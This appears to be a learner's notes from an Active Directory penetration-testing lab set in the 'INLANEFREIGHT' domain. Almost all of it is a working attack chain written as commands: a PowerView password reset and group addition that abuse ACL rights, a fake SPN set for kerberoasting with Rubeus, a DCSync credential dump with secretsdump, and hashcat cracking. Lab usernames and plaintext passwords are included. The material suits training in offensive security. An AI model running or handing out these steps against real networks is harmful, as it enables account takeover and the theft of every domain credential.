# Used credentials in this module:
wley:transporter@4
# ACL Abuse Tactics

Make wley creds to authenticate as this chap
```
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

Create new credentials for damundsen
```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Now we need to impersonate damundsen
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

damundsen has "GenericWrite" privileges on group "HELF DESK LEVEL 1" so we can add himself to that group
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
#Double check she is a member now
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

The Help Desk group has "GenericAll" privileges over ADUNN user (via IT group).. Since "damundsen" is a member of this group now we can add an SPN 
to adunn user to kerberoast.
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Then generate the TGS ticket
```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
Now we can attempt to crack the hash

# DC sync attack

Perform a DC sync attack from a user who has `DS-Replication-Get-Changes-All` rights
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

password:SyncMaster757
```

# Cracking a hash for an SPN in a cross-forest AD setup
```
hashcat -m 13100 hash.txt rockyou.txt -O --show
```



